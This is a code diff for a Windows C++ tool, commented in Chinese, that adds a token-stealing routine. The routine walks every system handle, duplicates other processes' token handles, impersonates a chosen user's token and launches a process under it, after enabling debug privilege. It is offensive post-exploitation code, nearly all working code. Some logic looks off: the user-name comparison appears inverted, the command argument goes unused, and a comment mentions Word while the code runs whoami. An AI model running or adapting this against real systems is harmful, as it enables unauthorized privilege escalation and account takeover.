@@ -1026,6 +1026,147 @@ TCHAR* CharToTCHAR(char* pChar)
 	MultiByteToWideChar(CP_ACP, 0, pChar, nLen, pTchar, nLen);
 	return pTchar;
 }
+BOOL ExecuteCmd(TCHAR* username,TCHAR* cmd) {
+
+	system("whoami");
+	// 遍历所有的token
+	NTSTATUS status;
+	PSYSTEM_HANDLE_INFORMATION_EX pshi = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(sizeof(SYSTEM_HANDLE_INFORMATION_EX));
+	NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandle(_T("NTDLL.DLL")), "NtQuerySystemInformation");
+	char tmpStr[BUF_SIZE] = { 0 };
+	DWORD dwRet = 0;
+	PTOKEN_GROUPS_AND_PRIVILEGES pTokenGroupsAndPrivileges = NULL;
+	HANDLE hObject = NULL;
+	HANDLE hObject2 = NULL;
+	HANDLE hProc = NULL;
+
+
+	if (pshi) {
+		status = NtQuerySystemInformation(SystemHandleInformation, pshi, sizeof(SYSTEM_HANDLE_INFORMATION_EX), NULL);
+		for (ULONG r = 0; r < pshi->NumberOfHandles; r++)
+		{
+			// Token类型的值是5
+			if (pshi->Information[r].ObjectTypeNumber == 5)
+			{
+				// 输出句柄所在的进程ID
+				//printf("ProcessId: %d\n", pshi->Information[r].ProcessId);
+				// 输出句柄类型
+				//printf("\tHandleType\t: Token\n");
+				//printf("\tHandleOffset\t: 0x%x\n", pshi->Information[r].Handle);
+				// 句柄对应的内核对象
+				//printf("\t内核对象\t\t: 0x%p\n", pshi->Information[r].Object);
+				// 打开进程句柄
+				hProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, (DWORD)pshi->Information[r].ProcessId);
+				if (hProc == NULL) {
+					hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)pshi->Information[r].ProcessId);
+					if (hProc == NULL) {
+						printf("\t获取进程句柄失败，Error: %d\n", GetLastError());
+						// 下个句柄
+						goto loopCon;
+					}
+				}
+				// 获取pid对应的进程名
+				TCHAR* tProcName;
+				//if (GetProcessNameFromPid((DWORD)pshi->Information[r].ProcessId, &tProcName)) {
+					//printf("\tProcessName\t: %S\n", tProcName);
+				//}
+				// 复制token句柄到当前进程的句柄表中
+				if (DuplicateHandle(hProc, (HANDLE)(pshi->Information[r].Handle), GetCurrentProcess(), &hObject, MAXIMUM_ALLOWED, FALSE, 0x02) != FALSE)
+				{
+					// 从token中获取登录会话ID
+					dwRet = 0;
+					PTOKEN_GROUPS_AND_PRIVILEGES pTokenGroupsAndPrivileges = NULL;
+					GetTokenInformation(hObject, TokenGroupsAndPrivileges, pTokenGroupsAndPrivileges, dwRet, &dwRet);
+					if (dwRet == 0) {
+						printf("\tdwreterror,ERROR: %d\n", GetLastError());
+						//getchar();
+					}
+					else {
+						pTokenGroupsAndPrivileges = (PTOKEN_GROUPS_AND_PRIVILEGES)calloc(dwRet, 1);
+						if (!GetTokenInformation(hObject, TokenGroupsAndPrivileges, pTokenGroupsAndPrivileges, dwRet, &dwRet)) {
+							//printf("\t获取令牌信息失败，ERROR: %d\n", GetLastError());
+						}
+						else {
+							//printf("\tLogonId\t\t: %08x-%08x\n", pTokenGroupsAndPrivileges->AuthenticationId.HighPart, pTokenGroupsAndPrivileges->AuthenticationId.LowPart);
+						}
+					}
+					// 从token中获取用户名
+					GetDomainUsernameFromToken(hObject, tmpStr);
+					if (wcscmp(CharToTCHAR(tmpStr), username)) {
+						printf(" \tTokenUser\t: %s\n", tmpStr);
+						//system("cmd");
+						//return TRUE;
+					}
+					// 从token中获取令牌类型
+					GetTokenTypeFromToken(hObject);
+					// 使用本进程的线程来模拟令牌
+					if (ImpersonateLoggedOnUser(hObject) == 0) {
+						printf("\t本线程模拟令牌失败,ERROR: %d\n", GetLastError());
+						printf("\t\t该令牌不能够被模拟\n");
+						goto loopCon;
+					}
+					else {
+						printf("\t本线程模拟令牌成功：\n");
+						if (wcscmp(CharToTCHAR(tmpStr), username)) {
+							printf(" \tTokenUser\t: %s\n", tmpStr);
+							//system("cmd");
+							STARTUPINFO startupInfo = { 0 };
+							PROCESS_INFORMATION  processInformation = { 0 };
+							/*打开Word应用程序 C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE 为程序路径*/
+							BOOL bSuccess = CreateProcess(TEXT("C:\\Windows\\SysWOW64\\whoami.exe"),NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &startupInfo, &processInformation);
+
+							if (bSuccess)
+							{
+								cout << "Process started..." << endl
+									<< "ProcessID: "
+									<< processInformation.dwProcessId << endl;
+							}
+							else
+							{
+								cout << "Can not start process!" << endl
+									<< "Error code: " << GetLastError();
+							}
+							return TRUE;
+						}
+						// 打开并获取令牌
+						OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hObject2);
+						// 返回到自己的安全上下文
+						RevertToSelf();
+						// 判断获取来的令牌是不是模拟令牌
+						if (IsImpersonationToken(hObject)) {
+							printf("\t\t该令牌能够被模拟\n");
+							//getchar();
+						}
+						else {
+							printf("\t\t该令牌不能够被模拟\n");
+							//getchar();
+						}
+					}
+					//}
+				}
+				else {
+					//printf("\t拷贝Token句柄失败,ERROR: %d\n", GetLastError());
+					goto loopCon;
+				}
+			loopCon:
+				//printf("\n");
+				if (hObject2 != NULL) {
+					CloseHandle(hObject2);
+				}
+				if (hObject != NULL) {
+					CloseHandle(hObject);
+				}
+				if (hProc != NULL) {
+					CloseHandle(hProc);
+				}
+			}
+		}
+		free(pshi);
+	}
+	// 模拟token
+
+	return TRUE;
+}
 int _tmain(int argc, _TCHAR* argv[])
 {
 	DWORD tmpRes = TryEnableDebugPriv(NULL);
@@ -1034,9 +1175,15 @@ int _tmain(int argc, _TCHAR* argv[])
 	// 从命令行获取参数
 	char opt;
 	char* optStr= NULL;
+	TCHAR tmpstrx[10] = _T("cmd");
 	while ((opt = getopt(argc, argv, "p:t:lcvpu:e:")) != -1){
 		
 		switch (opt) {
+		case 'u':
+			optStr = TCHARToChar(optarg);
+			cout << opt << " : " << optStr << endl;
+			ExecuteCmd(optarg,tmpstrx);
+			break;
 		case 'p':
 			optStr = TCHARToChar(optarg);
 			cout << opt << " : " << optStr << endl;
